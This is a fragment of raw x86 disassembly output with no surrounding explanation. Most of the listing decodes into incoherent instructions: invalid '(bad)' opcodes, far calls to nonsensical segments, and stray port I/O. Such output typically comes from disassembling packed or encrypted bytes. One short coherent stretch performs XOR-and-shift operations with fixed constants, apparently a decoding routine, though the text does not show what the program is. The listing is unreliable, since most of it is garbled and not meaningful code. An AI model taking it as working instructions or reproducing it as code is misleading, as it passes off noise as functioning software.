  4074f2:	inc    ebp
  4074f3:	bound  edx,QWORD PTR [ebp+0x4ec186d9]
  4074f9:	or     eax,0x578e5e09
  4074fe:	dec    eax
  4074ff:	cmp    DWORD PTR [ecx],esp
  407501:	outs   dx,DWORD PTR ds:[esi]
  407502:	add    DWORD PTR [edi+0xf],ebx
  407505:	nop
  407506:	push   edi
  407507:	mov    es,WORD PTR [ebp+0x43]
  40750a:	ins    BYTE PTR es:[edi],dx
  40750b:	push   esi
  40750c:	sahf   
  40750d:	dec    eax
  40750e:	mov    esp,0xc01b5a52
  407513:	fsubr  st,st(2)
  407515:	iret   
  407516:	push   0xe2af8545
  40751b:	js     0x4074c9
  40751d:	(bad)  
  40751f:	repz xchg edx,eax
  407521:	pop    es
  407522:	dec    ebx
  407523:	push   ebx
  407524:	add    BYTE PTR [ecx+0x26],al
  407527:	xor    esi,DWORD PTR [ecx-0x49]
  40752a:	in     eax,0x0
  40752c:	and    edx,ebp
  40752e:	aad    0xa0
  407530:	dec    esp
  407531:	dec    esi
  407532:	in     al,0xed
  407534:	les    edx,FWORD PTR [ebx-0xd]
  407537:	fadd   QWORD PTR [esi-0x36]
  40753a:	pop    edi
  40753b:	ds inc edi
  40753d:	mov    ah,0x3f
  40753f:	hlt    
  407540:	adc    ebp,DWORD PTR [eax]
  407542:	call   0xbbfe2ee9
  407547:	adc    bl,BYTE PTR [eax-0x7d236735]
  40754d:	in     al,dx
  40754e:	xor    dl,BYTE PTR [eax]
  407550:	xlat   BYTE PTR ds:[ebx]
  407551:	iret   
  407552:	sbb    ebx,esp
  407554:	sub    dh,BYTE PTR [eax+0x7d910788]
  40755a:	mov    ebx,0x39aa8b11
  40755f:	xchg   edx,edi
  407561:	out    dx,eax
  407562:	or     cl,bl
  407564:	jp     0x407592
  407566:	inc    ebp
  407567:	jb     0x4075ab
  407569:	cmp    dh,BYTE PTR ds:0x545fec6c
  40756f:	mov    cl,BYTE PTR gs:[eax+0x20]
  407573:	fnsave ds:0xa95a7d13
  407579:	not    BYTE PTR [esi]
  40757b:	lock dec edi
  40757d:	sub    esp,0xffffff91
  407580:	cld    
  407581:	xor    eax,0x4bd28261
  407586:	lahf   
  407587:	push   es
  407588:	in     al,0x43
  40758a:	cwde   
  40758b:	gs adc al,0x80
  40758e:	repnz or al,0x8
  407591:	mov    ecx,DWORD PTR [ebp-0x4c]
  407594:	shrd   eax,ecx,0x2
  407598:	shr    ecx,0x2
  40759b:	mov    cx,ax
  40759e:	mov    eax,DWORD PTR [ebp-0x50]
  4075a1:	mov    edx,0x695d
  4075a6:	xor    cx,dx
  4075a9:	mov    edx,DWORD PTR [ebp-0x4c]
  4075ac:	xor    edx,edx
  4075ae:	shl    eax,0x1e
  4075b1:	mov    ax,dx
  4075b4:	or     ax,cx
  4075b7:	mov    ecx,DWORD PTR [ebp-0x4]
  4075ba:	cmp    WORD PTR [ecx],ax
  4075bd:	je     0x407e12
  4075c3:	mov    eax,DWORD PTR [ebp+0x14]
  4075c6:	sub    DWORD PTR [ebp-0x4],eax
  4075c9:	mov    ecx,DWORD PTR [ebx]
  4075cb:	mov    eax,DWORD PTR [ebx+0x4]
  4075ce:	xor    eax,0x9c1b89e8
  4075d3:	xor    ecx,0xca79a577
  4075d9:	shrd   ecx,eax,0x2
  4075dd:	shr    eax,0x2
  4075e0:	mov    DWORD PTR [ebp-0x64],eax
  4075e3:	mov    eax,DWORD PTR [ebx]
  4075e5:	mov    edx,DWORD PTR [ebx+0x4]
  4075e8:	mov    edx,eax
  4075ea:	xor    eax,eax
  4075ec:	or     eax,ecx
  4075ee:	mov    DWORD PTR [ebp-0x70],eax
  4075f1:	mov    eax,DWORD PTR [esi]
  4075f3:	mov    ecx,DWORD PTR [esi+0x4]
  4075f6:	xor    ecx,0x9c1b89e8
  4075fc:	xor    eax,0xca79a577
  407601:	jmp    0x4079df
  407606:	mov    dl,0x68
  407608:	jg     0x407620
  40760a:	cmp    ebp,edi
  40760c:	sbb    ah,BYTE PTR [ecx+eax*1]
  40760f:	or     al,0x81
  407611:	mov    al,0xf7
  407613:	int3   
  407614:	jns    0x407692
  407616:	pop    ss
  407617:	jge    0x407631
  407619:	sbb    BYTE PTR [esi+0x46181812],bl
  40761f:	adc    BYTE PTR [ecx-0x499c5422],dl
  407625:	stos   WORD PTR es:[edi],ax
  407627:	ins    BYTE PTR es:[edi],dx
  407628:	pop    ecx
  407629:	push   ecx
  40762a:	xchg   DWORD PTR [edi-0x3203382],ebx
  407630:	add    DWORD PTR [edi],edi
  407632:	ret    
  407633:	bound  ebp,QWORD PTR [eax]
  407635:	scas   eax,DWORD PTR es:[edi]
  407636:	cmp    eax,0x85a044d1
  40763b:	in     al,0xe9
  40763d:	sbb    al,0x97
  40763f:	jne    0x407614
  407641:	std    
  407642:	pop    esi
  407643:	push   es
  407644:	dec    esi
  407645:	outs   dx,BYTE PTR ds:[esi]
  407646:	test   BYTE PTR [ecx-0x2e9569fb],bh
  40764c:	mov    ds:0x371600aa,eax
  407651:	push   ss
  407652:	ins    BYTE PTR es:[edi],dx
  407653:	popa   
  407654:	mov    bl,0x12
  407656:	cli    
  407657:	cmp    BYTE PTR [edi],al
  407659:	add    esp,ebx
  40765b:	outs   dx,BYTE PTR ds:[esi]
  40765c:	into   
  40765d:	mov    ah,0xbb
  40765f:	in     al,0x52
  407661:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407662:	lea    edi,ds:0x2281924
  407668:	and    eax,0xa560ce4f
  40766d:	jno    0x4076db
  40766f:	pop    es
  407670:	cld    
  407671:	sub    eax,0x6331b787
  407676:	iret   
  407677:	xor    BYTE PTR [ebx-0x3b],dl
  40767a:	sub    cl,bh
  40767c:	jne    0x4076d6
  40767e:	inc    ebp
  40767f:	mov    eax,ds:0xb898a6e6
  407684:	inc    eax
  407685:	cld    
  407686:	mov    esi,0x48b65c24
  40768b:	icebp  
  40768c:	mov    ecx,DWORD PTR [ebx-0x5c]
  40768f:	mov    ch,0x1e
  407691:	popa   
  407692:	fidivr DWORD PTR [edx+0x3c2b2786]
  407698:	or     al,0x45
  40769a:	mov    cl,0xfd
  40769c:	cdq    
  40769d:	fsubr  QWORD PTR es:[ecx]
  4076a0:	sub    ebx,edx
  4076a2:	test   BYTE PTR [edx-0x54],0x66
  4076a6:	repz out 0x28,eax
  4076a9:	jns    0x4076fe
  4076ab:	mov    al,ds:0x14f8182
  4076b0:	popa   
  4076b1:	mov    esp,0xf6871775
  4076b6:	outs   dx,BYTE PTR ds:[esi]
  4076b7:	xchg   edx,eax
  4076b8:	fwait
  4076b9:	aas    
  4076ba:	aas    
  4076bb:	enter  0x40f0,0x5e
  4076bf:	sub    DWORD PTR [ebp+ebp*4-0x78],esi
  4076c3:	mov    al,ds:0x763a3b9d
  4076c8:	pop    ds
  4076c9:	cmp    ax,0xacf6
  4076cd:	mov    DWORD PTR [esi+0x7bed7998],esp
  4076d3:	pop    esp
  4076d4:	mov    ecx,0x9d1ce3ca
  4076d9:	lods   eax,DWORD PTR ds:[esi]
  4076da:	int3   
  4076db:	rol    BYTE PTR [ecx],0x8
  4076de:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4076df:	xor    dh,cl
  4076e1:	adc    DWORD PTR [esi],esp
  4076e3:	rep outs dx,BYTE PTR ds:[esi]
  4076e5:	adc    al,cl
  4076e7:	mov    ss,WORD PTR ss:[eax+0x7be546f3]
  4076ee:	in     eax,dx
  4076ef:	cli    
  4076f0:	ror    DWORD PTR ds:0x1147ff66,0x76
  4076f7:	add    DWORD PTR [esi],eax
  4076f9:	inc    esp
  4076fa:	inc    ebp
  4076fb:	addr16 push ss
  4076fd:	pop    ds
  4076fe:	lods   al,BYTE PTR ds:[esi]
  4076ff:	push   ds
  407700:	jb     0x4076e1
  407702:	mov    edi,0x9c66caf0
  407707:	sbb    BYTE PTR [edi-0x29],bh
  40770a:	mov    ds:0x701dd15a,eax
  40770f:	(bad)  
  407710:	aaa    
  407711:	retf   0x3058
  407714:	pop    esi
  407715:	push   DWORD PTR [eax-0x113b0d60]
  40771b:	(bad)  
  40771c:	aad    0x1a
  40771e:	ss push es
  407720:	ficomp DWORD PTR [esi+esi*8+0x4f]
  407724:	(bad)  
  407726:	scas   eax,DWORD PTR es:[edi]
  407727:	mov    eax,ds:0xfcff03d3
  40772c:	adc    al,0x64
  40772e:	mov    ah,BYTE PTR [ecx-0x77]
  407731:	push   edx
  407732:	fnclex 
  407734:	out    0x59,al
  407736:	std    
  407737:	in     eax,dx
  407738:	xor    al,0x2f
  40773a:	shl    DWORD PTR [ecx+0x19],1
  40773d:	mov    eax,ds:0x4e17edc7
  407742:	xor    dh,BYTE PTR [edi+0x3e228952]
  407748:	cld    
  407749:	adc    eax,0x6c5a547e
  40774e:	shl    esi,cl
  407750:	adc    al,0xfc
  407752:	jne    0x4076e7
  407754:	dec    esi
  407755:	push   0x37
  407757:	outs   dx,BYTE PTR ds:[esi]
  407758:	dec    ebx
  407759:	cmc    
  40775a:	sbb    edx,esp
  40775c:	add    BYTE PTR [esi-0x1a4ee357],ch
  407762:	pop    ecx
  407763:	adc    bh,BYTE PTR [ebx-0x6c2f2375]
  407769:	mov    eax,ds:0x7587019d
  40776e:	and    al,0xe7
  407770:	repnz and DWORD PTR [edi+ecx*4],ebp
  407774:	jp     0x407796
  407776:	fwait
  407777:	std    
  407778:	and    edx,eax
  40777a:	dec    esp
  40777b:	sahf   
  40777c:	shl    BYTE PTR [ebp+0x60],1
  40777f:	push   edx
  407780:	sub    eax,0x1c432b28
  407785:	push   es
  407786:	pop    eax
  407787:	add    BYTE PTR [ebp-0x766d1ff3],dl
  40778d:	mov    edi,0x63570ca8
  407792:	pop    ebx
  407793:	mov    DWORD PTR [edx+ebx*2-0x34b9667d],edx
  40779a:	xchg   DWORD PTR [ebx-0x1b],edx
  40779d:	repnz scas al,BYTE PTR es:[edi]
  40779f:	pop    eax
  4077a0:	and    ecx,DWORD PTR [edi+0x7]
  4077a3:	or     DWORD PTR [ebp+0x640d8b0],esp
  4077a9:	inc    ecx
  4077aa:	xor    esi,DWORD PTR ds:0x541b97b0
  4077b0:	ror    DWORD PTR [edx+edi*4],1
  4077b3:	pushf  
  4077b4:	adc    eax,0x7c9463e8
  4077b9:	xor    BYTE PTR [esi-0x42],cl
  4077bc:	test   BYTE PTR [edi-0x71a13592],cl
  4077c2:	sbb    dh,al
  4077c4:	rcr    DWORD PTR [ecx],cl
  4077c6:	adc    bh,0xcc
  4077c9:	cmp    al,0x8c
  4077cb:	repnz mov ds:0xe1718385,al
  4077d1:	popf   
  4077d2:	sbb    al,0xa5
  4077d4:	mov    ds:0xe58ee319,al
  4077d9:	fwait
  4077da:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4077db:	dec    esi
  4077dc:	pusha  
  4077dd:	sbb    al,0xa9
  4077df:	xor    eax,0x3725161b
  4077e4:	scas   al,BYTE PTR es:[edi]
  4077e5:	arpl   WORD PTR [ecx+0xf],dx
  4077e8:	xchg   edi,eax
  4077e9:	sbb    esp,DWORD PTR [edx+0x10de150c]
  4077ef:	mov    ebp,0x45d042cb
  4077f4:	cwde   
  4077f5:	aas    
  4077f6:	xor    BYTE PTR [edx-0x59],dh
  4077f9:	pop    esi
  4077fa:	and    eax,0x57a64d7e
  4077ff:	inc    edx
  407800:	jmp    0xe9f8cca7
  407805:	in     al,dx
  407806:	pop    edi
  407807:	scas   al,BYTE PTR es:[edi]
  407808:	add    eax,0x4f8e5d09
  40780d:	push   esi
  40780e:	cdq    
  40780f:	stos   BYTE PTR es:[edi],al
  407810:	inc    edx
  407811:	cmp    edi,DWORD PTR [esi]
  407813:	aad    0xdf
  407815:	ficomp WORD PTR [ebp+0x51]
  407818:	inc    edx
  407819:	(bad)  
  40781a:	jmp    0x2a39a986
  40781f:	int    0x72
  407821:	add    dh,BYTE PTR [ebx+0x1450fb10]
  407827:	pop    esp
  407828:	mov    bh,0x7
  40782a:	mov    DWORD PTR [ebp+0x43],ebx
  40782d:	xchg   ecx,eax
  40782e:	mov    esp,0x1ed4f96b
  407833:	cs stos DWORD PTR es:[edi],eax
  407835:	test   eax,0x33b92b96
  40783a:	mov    ch,0x3c
  40783c:	in     al,dx
  40783d:	sub    BYTE PTR [edi],ah
  40783f:	inc    esp
  407840:	mov    esi,0xb76a2a92
  407845:	pop    edi
  407846:	or     eax,0x30076e8a
  40784b:	mov    al,ds:0x76dbd37e
  407850:	hlt    
  407851:	popa   
  407852:	adc    bh,BYTE PTR [ecx-0x2b]
  407855:	fnstcw WORD PTR [eax-0x8c3c908]
  40785b:	inc    edi
  40785c:	push   ecx
  40785d:	or     BYTE PTR [ebp-0x1e],ch
  407860:	and    DWORD PTR [ebx+0x716cc5b],ebp
  407866:	pop    edx
  407867:	mov    ch,0x63
  407869:	xchg   DWORD PTR [ecx-0x500d0a1b],ecx
  40786f:	push   es
  407870:	or     ch,bl
  407872:	sub    edx,esp
  407874:	(bad)  
  407875:	repz call 0xa83f:0x5d083fa3
  40787d:	cmp    bl,BYTE PTR [esi-0x32]
  407880:	sub    esp,ebp
  407882:	loope  0x407892
  407884:	hlt    
  407885:	lods   eax,DWORD PTR ds:[esi]
  407886:	fnstcw WORD PTR [edx]
  407888:	popa   
  407889:	xchg   edx,eax
  40788a:	pushf  
  40788b:	ins    DWORD PTR es:[edi],dx
  40788c:	call   0xb62a:0xb862b229
  407893:	push   esp
  407894:	(bad)  
  407896:	popf   
  407897:	ja     0x40782e
  407899:	mov    edi,ds
  40789b:	stos   BYTE PTR es:[edi],al
  40789c:	pop    esp
  40789d:	ffreep st(1)
  40789f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4078a0:	mov    eax,DWORD PTR [ecx]
  4078a2:	or     ah,dl
  4078a4:	push   edx
  4078a5:	fs and ecx,esi
  4078a8:	gs mov esp,0xad146a2f
  4078ae:	xchg   esp,eax
  4078af:	xlat   BYTE PTR ds:[ebx]
  4078b0:	repnz lods eax,DWORD PTR ds:[esi]
  4078b3:	pusha  
  4078b4:	(bad)  [ecx+eiz*4+0x6d469b89]
  4078bb:	test   dl,ch
  4078bd:	push   ecx
  4078be:	test   al,0x24
  4078c0:	jg     0x407917
  4078c2:	dec    esp
  4078c3:	and    eax,0x76c0c22b
  4078c8:	dec    esp
  4078c9:	push   ds
  4078ca:	in     eax,dx
  4078cb:	fwait
  4078cc:	out    dx,al
  4078cd:	out    dx,al
  4078ce:	cmp    esp,ebp
  4078d0:	arpl   WORD PTR [ebx-0x1e],sp
  4078d3:	sub    DWORD PTR [edx],ebp
  4078d5:	push   ss
  4078d6:	lea    ebp,[ebx-0x6fa5865e]
  4078dc:	push   cs
  4078dd:	scas   eax,DWORD PTR es:[edi]
  4078de:	xlat   BYTE PTR ds:[ebx]
  4078df:	ja     0x40795e
  4078e1:	outs   dx,BYTE PTR ds:[esi]
  4078e2:	daa    
  4078e3:	and    ebx,DWORD PTR [edi+0x371a1a66]
  4078e9:	add    ebx,DWORD PTR [ebx+esi*4]
  4078ec:	pop    esi
  4078ed:	inc    edx
  4078ee:	pop    esi
  4078ef:	pop    eax
  4078f0:	outs   dx,BYTE PTR ds:[esi]
  4078f1:	sub    esp,DWORD PTR ss:[ebx+0x7f]
  4078f5:	xor    al,0xf5
  4078f7:	xchg   ecx,eax
  4078f8:	ss jne 0x4078da
  4078fb:	(bad)  
  4078fc:	xchg   dl,dh
  4078fe:	(bad)  
  4078ff:	jge    0x40790e
  407901:	lahf   
  407902:	data16 cmp BYTE PTR [eax-0x41],0x47
  407907:	add    ebx,edx
  407909:	xor    esp,DWORD PTR [edi+eax*2]
  40790c:	add    al,0x8d
  40790e:	xchg   BYTE PTR [eax+0x0],al
  407911:	data16 (bad) 
  407913:	hlt    
  407914:	jmp    0xc33d:0xc46db8b0
  40791b:	xchg   ebp,eax
  40791c:	xchg   edi,eax
  40791d:	mov    dl,BYTE PTR [ecx+edx*4-0x23]
  407921:	sbb    DWORD PTR [ebx+edx*2-0x54126e30],ebx
  407928:	stc    
  407929:	cwde   
  40792a:	push   ss
  40792b:	adc    ch,bh
  40792d:	pushf  
  40792e:	aam    0xd3
  407930:	ins    DWORD PTR es:[edi],dx
  407931:	xchg   esi,eax
  407932:	aad    0x5
  407934:	jl     0x4079b4
  407936:	imul   eax,esp,0x32
  407939:	push   ebx
  40793a:	lods   eax,DWORD PTR es:[esi]
  40793c:	dec    edi
  40793d:	jnp    0x4078d3
  40793f:	retf   0x36e4
  407942:	xchg   edx,eax
  407943:	mov    edx,0x7152bddd
  407948:	adc    eax,0x4d51c2dd
  40794d:	xchg   ebp,eax
  40794e:	ret    
  40794f:	adc    ebx,0x2ee65ce3
  407955:	push   0xcf7da466
  40795a:	fwait
  40795b:	and    al,0x9a
  40795d:	popa   
  40795e:	enter  0xb6b7,0x6a
  407962:	add    al,0xd1
  407964:	dec    edx
  407965:	test   al,0x66
  407967:	push   ecx
  407968:	push   eax
  407969:	sub    edx,DWORD PTR [edx]
  40796b:	push   esp
  40796c:	in     eax,0xce
  40796e:	push   0x43
  407970:	push   es
  407971:	sbb    BYTE PTR [ebx-0x2],0x7a
  407975:	rcl    BYTE PTR [esi+edx*1+0x43],0x65
  40797a:	fdivp  st(5),st
  40797c:	bnd jne 0x407970
  40797f:	dec    ecx
  407980:	or     al,0xec
  407982:	scas   al,BYTE PTR es:[edi]
  407983:	mov    bh,0x95
  407985:	pop    ecx
  407986:	(bad)  
  407987:	xor    dl,BYTE PTR [esi-0x62]
  40798a:	cmp    BYTE PTR [esi-0x5063b2b],0xc9
  407991:	retf   
  407992:	out    0xe4,eax
  407994:	lods   al,BYTE PTR ds:[esi]
  407995:	je     0x407978
  407997:	dec    ebx
  407998:	arpl   dx,sp
  40799a:	mov    ch,0xa
  40799c:	ds test esp,ecx
  40799f:	nop
  4079a0:	mov    edi,0x9c212048
  4079a5:	dec    eax
  4079a6:	test   edi,edi
  4079a8:	repz adc BYTE PTR [eax+eax*1],0x2e
  4079ad:	es pop ebx
  4079af:	sub    edi,DWORD PTR [ecx+0x69]
  4079b2:	pop    esp
  4079b3:	repz xor BYTE PTR [ebx-0x50],0x94
  4079b8:	or     BYTE PTR [edx+0x78ef906a],ah
  4079be:	and    al,0xbc
  4079c0:	std    
  4079c1:	jge    0x407998
  4079c3:	pop    ss
  4079c4:	call   0x12ce:0x61eacebe
  4079cb:	fcomp  DWORD PTR [esi+edx*1+0x66]
  4079cf:	mov    esi,0x7c6279fa
  4079d4:	mov    gs,WORD PTR [edx+0x3eaf5fe7]
  4079da:	push   0x38
  4079dc:	pop    esi
  4079dd:	ret    
  4079de:	inc    esp
  4079df:	mov    DWORD PTR [ebp-0x34],eax
  4079e2:	jmp    0x407dc0
  4079e7:	repnz jecxz 0x407a47
  4079ea:	jmp    0x407a49
  4079ec:	imul   esp,DWORD PTR [ebx-0x25],0xffffffa9
  4079f0:	pushf  
  4079f1:	pop    ds
  4079f2:	jle    0x407a60
  4079f4:	nop
  4079f5:	retf   
  4079f6:	jo     0x407995
  4079f8:	jne    0x407a12
  4079fa:	sbb    BYTE PTR [esi+0x2e181812],bl
  407a00:	jmp    esi
  407a02:	xor    bl,al
  407a04:	outs   dx,BYTE PTR ds:[esi]
  407a05:	pop    esp
  407a06:	jb     0x407a01
  407a08:	dec    ebp
  407a09:	pop    edx
  407a0a:	stos   BYTE PTR es:[edi],al
  407a0b:	jg     0x407a37
  407a0d:	lea    ebx,[ebp-0x4f02e94a]
  407a13:	mov    DWORD PTR [ebp+0x6938b71e],0xc2794c11
  407a1d:	pop    ss
  407a1e:	call   0x79b5:0x1ab1c03f
  407a25:	mov    ah,0x79
  407a27:	jb     0x4079d2
  407a29:	xchg   ecx,eax
  407a2a:	stos   DWORD PTR es:[edi],eax
  407a2b:	sbb    DWORD PTR [ebp-0x3f290384],esi
  407a31:	cld    
  407a32:	jne    0x407aac
  407a34:	cmp    edx,edi
  407a36:	mov    ?,ecx
  407a38:	xor    eax,0x2eae8dec
  407a3d:	jb     0x407a19
  407a3f:	pop    esp
  407a40:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407a41:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407a42:	lock push ss
  407a44:	and    BYTE PTR [ebp-0x4c],dl
  407a47:	xor    al,0x51
  407a49:	and    BYTE PTR ds:0xb3819be2,0x78
  407a50:	dec    ebx
  407a51:	jb     0x407a01
  407a53:	(bad)
  407a56:	and    al,0xf0
  407a58:	outs   dx,DWORD PTR ds:[esi]
  407a59:	stc    
  407a5a:	stc    
  407a5b:	pop    ds
  407a5c:	ror    DWORD PTR [esi-0x10],0x3d
  407a60:	pop    ss
  407a61:	push   ebx
  407a62:	nop
  407a63:	enter  0x8683,0xe9
  407a67:	xchg   ebx,eax
  407a68:	scas   al,BYTE PTR es:[edi]
  407a69:	cmp    DWORD PTR [eax-0x58],ebp
  407a6c:	ror    BYTE PTR [edi],1
  407a6e:	push   0x7a0b47fb
  407a73:	aam    0x31
  407a75:	mov    edi,0xa10bec57
  407a7a:	add    cl,BYTE PTR [ebx+0xe]
  407a7d:	mov    DWORD PTR ds:0x753f580c,edx
  407a83:	mov    fs,esi
  407a85:	push   ss
  407a86:	pop    ss
  407a87:	ror    bh,1
  407a89:	lods   al,BYTE PTR ds:[esi]
  407a8a:	jbe    0x407adc
  407a8c:	ret    0x68ae
  407a8f:	or     dl,ah
  407a91:	mov    dl,0x49
  407a93:	inc    esp
  407a94:	jmp    0x4b37ee66
  407a99:	push   es
  407a9a:	leave  
  407a9b:	dec    ebx
  407a9c:	push   eax
  407a9d:	or     BYTE PTR [edi],0x9e
  407aa0:	xor    bl,BYTE PTR [ebx-0x40ae76c4]
  407aa6:	dec    ebx
  407aa7:	mov    dl,0x90
  407aa9:	push   eax
  407aaa:	popf   
  407aab:	inc    esp
  407aac:	jmp    0x407abd
  407aae:	mov    ecx,0xe4f0a653
  407ab3:	cdq    
  407ab4:	fldcw  WORD PTR [ebx-0x24]
  407ab7:	addr16 sbb bh,0x15
  407abb:	shr    DWORD PTR [eax],0x9f
  407abe:	jbe    0x407ac3
  407ac0:	fcomp  DWORD PTR [edi-0x13f1b972]
  407ac6:	inc    edx
  407ac7:	ror    DWORD PTR [edx+0x79280ad3],0x24
  407ace:	aaa    
  407acf:	ins    BYTE PTR es:[edi],dx
  407ad0:	mov    WORD PTR [edx],cs
  407ad2:	sub    al,0xf8
  407ad4:	loop   0x407ae0
  407ad6:	cmp    dh,dh
  407ad8:	mov    edx,ecx
  407ada:	jecxz  0x407b50
  407adc:	jnp    0x407b5c
  407ade:	ins    BYTE PTR es:[edi],dx
  407adf:	jmp    0x407a65
  407ae1:	sti    
  407ae2:	(bad)  
  407ae4:	stos   BYTE PTR es:[edi],al
  407ae5:	push   esp
  407ae6:	outs   dx,DWORD PTR ds:[esi]
  407ae7:	repnz push es
  407ae9:	pop    ecx
  407aea:	aad    0x2b
  407aec:	xchg   ebx,eax
  407aed:	in     eax,dx
  407aee:	popa   
  407aef:	or     BYTE PTR [ecx+0x7fde2e15],ch
  407af5:	dec    ebx
  407af6:	inc    ecx
  407af7:	dec    esp
  407af8:	dec    eax
  407af9:	cmp    al,0x57
  407afb:	int    0xf2
  407afd:	ret    0x98f8
  407b00:	call   0x20c0962d
  407b05:	loop   0x407aeb
  407b07:	adc    bh,BYTE PTR [edi-0x77]
  407b0a:	and    eax,0x3b1ebb9c
  407b0f:	xchg   esi,eax
  407b10:	jae    0x407aa9
  407b12:	inc    edx
  407b13:	inc    ebx
  407b14:	mov    ebp,0x928617cc
  407b19:	or     eax,0x9e857ca8
  407b1e:	(bad)  
  407b1f:	jae    0x407ae8
  407b21:	in     eax,0xb9
  407b23:	fucomi st,st(3)
  407b25:	popa   
  407b26:	pop    ebx
  407b27:	dec    ebx
  407b28:	sahf   
  407b29:	sbb    al,0x23
  407b2b:	and    al,0xb1
  407b2d:	loope  0x407aca
  407b2f:	daa    
  407b30:	je     0x407b8d
  407b32:	stc    
  407b33:	cdq    
  407b34:	sub    BYTE PTR [eax-0x40236957],ch
  407b3a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407b3b:	out    0xe8,al
  407b3d:	jo     0x407b05
  407b3f:	bound  ebx,QWORD PTR [edi+eiz*1-0x42697683]
  407b46:	or     eax,0xe274bda
  407b4b:	or     BYTE PTR [ecx-0x33db56e6],ch
  407b51:	fnstsw ax
  407b53:	(bad)  [eax+0x1ba9fdda]
  407b59:	add    eax,0xe92e9793
  407b5e:	scas   eax,DWORD PTR es:[edi]
  407b5f:	sbb    ebp,ebx
  407b61:	outs   dx,BYTE PTR ds:[esi]
  407b62:	(bad)  
  407b63:	(bad)  
  407b65:	imul   edi,DWORD PTR [edi+0x78],0x32
  407b69:	scas   eax,DWORD PTR es:[edi]
  407b6a:	or     WORD PTR [ebx*1-0x288dc94],bp
  407b72:	xor    DWORD PTR [esi+0x1d],ebx
  407b75:	fcom   DWORD PTR [ebx+ecx*4]
  407b78:	mov    ebx,0xe8e6df3b
  407b7d:	shl    ebp,1
  407b7f:	pop    esi
  407b80:	rcr    BYTE PTR [ebx-0x5899f7d4],cl
  407b86:	inc    esi
  407b87:	shr    BYTE PTR [ebp+0x7b337164],1
  407b8d:	into   
  407b8e:	ins    BYTE PTR es:[edi],dx
  407b8f:	enter  0xa670,0x4a
  407b93:	(bad)  [esi+edx*4]
  407b96:	jns    0x407be4
  407b98:	not    ebx
  407b9a:	lods   eax,DWORD PTR ds:[esi]
  407b9b:	mov    cl,0x3e
  407b9d:	ror    DWORD PTR [esi+0x3f04c038],1
  407ba3:	sbb    al,0x44
  407ba5:	inc    esi
  407ba6:	jge    0x407b8b
  407ba8:	mov    es,WORD PTR [eax-0x15]
  407bab:	bound  esi,QWORD PTR [ebx+0x62]
  407bae:	scas   eax,DWORD PTR es:[edi]
  407baf:	pop    ebp
  407bb0:	sbb    al,0xdb
  407bb2:	jmp    0xb7079ccb
  407bb7:	fs into 
  407bb9:	fidiv  DWORD PTR [ebp-0x673b5056]
  407bbf:	cwde   
  407bc0:	xor    esp,ebx
  407bc2:	sbb    al,0xa1
  407bc4:	push   ds
  407bc5:	test   eax,0xb489f267
  407bca:	inc    ebp
  407bcb:	clc    
  407bcc:	add    cl,bl
  407bce:	mov    bh,0xcb
  407bd0:	cmp    eax,0x46058efa
  407bd5:	inc    eax
  407bd6:	pop    ss
  407bd7:	bnd js 0x407c45
  407bda:	cmp    al,0x54
  407bdc:	das    
  407bdd:	es cdq 
  407bdf:	mov    ?,edi
  407be1:	arpl   WORD PTR [ebp-0x29a6790c],sp
  407be7:	xchg   esi,eax
  407be8:	(bad)  
  407be9:	out    dx,al
  407bea:	mov    edx,0x4d2fbf0c
  407bef:	aaa    
  407bf0:	imul   ebp,DWORD PTR [esi],0xfbbda0ba
  407bf6:	add    BYTE PTR [eax+0x5],ch
  407bf9:	int3   
  407bfa:	inc    ecx
  407bfb:	ret    
  407bfc:	mov    DWORD PTR [ecx-0x33],esp
  407bff:	mov    al,ds:0x7a29c4c6
  407c04:	aaa    
  407c05:	stos   BYTE PTR es:[edi],al
  407c06:	cmp    DWORD PTR [ecx-0x3e9ea310],ebx
  407c0c:	cmp    eax,0xa5f1b9a4
  407c11:	ficomp DWORD PTR [edi+0xb]
  407c14:	mul    al
  407c16:	xchg   DWORD PTR [ebx+0x66389ed3],eax
  407c1c:	int    0x1c
  407c1e:	xchg   esp,eax
  407c1f:	dec    ebx
  407c20:	pop    edx
  407c21:	and    bh,bl
  407c23:	dec    ebx
  407c24:	or     eax,0xc91d361b
  407c29:	push   0x4a
  407c2b:	lahf   
  407c2c:	bound  ebp,QWORD PTR [edi-0x5f]
  407c2f:	sbb    al,0xbf
  407c31:	pop    edi
  407c32:	cmc    
  407c33:	fidivr WORD PTR [esi]
  407c35:	mov    bl,0x2c
  407c37:	call   0x8ba06b3e
  407c3c:	xchg   edi,eax
  407c3d:	das    
  407c3e:	int    0x37
  407c40:	pop    ds
  407c41:	(bad)  
  407c42:	mov    ds:0x42083829,eax
  407c47:	inc    eax
  407c48:	xor    al,0x34
  407c4a:	test   DWORD PTR [edi+0x4e],ebx
  407c4d:	mov    al,ds:0x1ab84e57
  407c52:	mov    dh,BYTE PTR ss:[eax]
  407c55:	mov    dh,0xf6
  407c57:	push   edx
  407c58:	aam    0x7b
  407c5a:	sub    al,0xf1
  407c5c:	sub    dh,ah
  407c5e:	scas   al,BYTE PTR es:[edi]
  407c5f:	add    al,0xee
  407c61:	loope  0x407bf0
  407c63:	call   0x6d7a:0xd5cded9b
  407c6a:	mov    ebp,0x6faedc7a
  407c6f:	push   edi
  407c70:	jb     0x407cac
  407c72:	mov    bh,0x97
  407c74:	pop    edi
  407c75:	and    ah,BYTE PTR [esi-0x200e1803]
  407c7b:	dec    ebx
  407c7c:	mov    cl,0x44
  407c7e:	push   ebx
  407c7f:	pop    ss
  407c80:	xchg   ecx,eax
  407c81:	adc    ecx,ebx
  407c83:	(bad)  
  407c85:	sbb    dl,dh
  407c87:	push   esp
  407c88:	inc    ebx
  407c89:	sbb    edx,DWORD PTR [esi+0x1f]
  407c8c:	mov    eax,0x5aa16a76
  407c91:	inc    ecx
  407c92:	or     eax,ebx
  407c94:	arpl   WORD PTR [edx-0xbebb389],ax
  407c9a:	fild   DWORD PTR [ecx-0x50]
  407c9d:	add    DWORD PTR [eax-0x5febde7e],esi
  407ca3:	add    ecx,edi
  407ca5:	pop    ecx
  407ca6:	popf   
  407ca7:	sbb    ebx,DWORD PTR es:[esi+0x6e]
  407cab:	test   eax,0xf2cf95f8
  407cb0:	nop
  407cb1:	dec    esi
